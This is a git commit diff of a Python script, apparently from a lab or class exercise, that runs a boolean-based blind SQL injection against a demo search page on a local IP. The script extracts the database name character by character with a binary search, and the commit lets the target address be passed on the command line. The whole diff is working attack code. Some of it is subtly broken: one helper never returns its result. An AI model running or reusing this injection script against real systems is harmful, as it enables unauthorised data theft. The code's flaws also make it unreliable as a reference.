ff27e6085c411e8e90969eb1326a0a22481daf02
Litrer <106829230+L1itrer@users.noreply.github.com>
2025-12-15 13:54:26 +0100

    Rename script2.py and parametrize the address from sys.args
    A quick hack for now so that we can work with different ip addresses
    In an ideal world we would just give a link and the script would work
    it's magic.

--- boolean_attack.py
+++ boolean_attack.py
@@ -1,6 +1,8 @@
 import requests
 import urllib.parse
-url = "http://192.168.1.3/demo/search.php"
+import sys
+
+# url = "http://192.168.1.3/demo/search.php"
 
 def get_search_lt(idx, ch): 
     return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) > '{ch}"
@@ -22,22 +24,22 @@ def encode_url(url, param):
     return final_url
 
 def is_succes(url):
-    response = requests.get(url)
+    response = requests.get(url, timeout=5.0)
     print(response.url == url_success)
     return response.url == url_success
 
 
-def lower(idx, ch):
+def lower(idx, ch, url: str):
     return is_succes(encode_url(url, get_search_lt(idx, ch)))
 
-def eq_char(idx, ch):
+def eq_char(idx, ch, url: str):
     is_succes(encode_url(url, get_search_eq(idx, ch)))
 
-def eq(name):
+def eq(name, url: str):
     return is_succes(encode_url(url, search_eq+name))
 
 
-def binary_search_char(idx, alphabet):
+def binary_search_char(idx, alphabet, url: str):
     lo, hi = 0, len(alphabet) - 1
 
     while lo <= hi:
@@ -45,9 +47,9 @@ def binary_search_char(idx, alphabet):
         guess = alphabet[mid]
         print(guess)
 
-        if eq_char(idx, guess):
+        if eq_char(idx, guess, url):
             return guess
-        elif lower(idx, guess):
+        elif lower(idx, guess, url):
             lo = mid + 1
         else:               
             hi = mid - 1
@@ -55,22 +57,31 @@ def binary_search_char(idx, alphabet):
     return None
 
 
-def guess_secret():
+def guess_secret(url: str):
     alphabet = "".join(chr(i) for i in range(ord('a'), ord('z') + 1))
     name = ""
     idx = 0
 
     while True:
-        if eq(name):
+        if eq(name, url):
             return name
         print(idx)
         print(name)
-        ch = binary_search_char(idx, alphabet)
+        ch = binary_search_char(idx, alphabet, url)
         if ch is None:
             raise ValueError("Character not found in ASCII!")
 
         name += ch
         idx += 1
 
+def main():
+    if len(sys.argv) == 1:
+        address = "192.168.1.3"
+    else:
+        address = sys.argv[1]
+    url  = f"http://{address}/demo/search.php"
+    print(f"Attacking url: {url}")
+    print("Guessed:", guess_secret(url))
+    pass
 
-print("Guessed:", guess_secret())
+main()
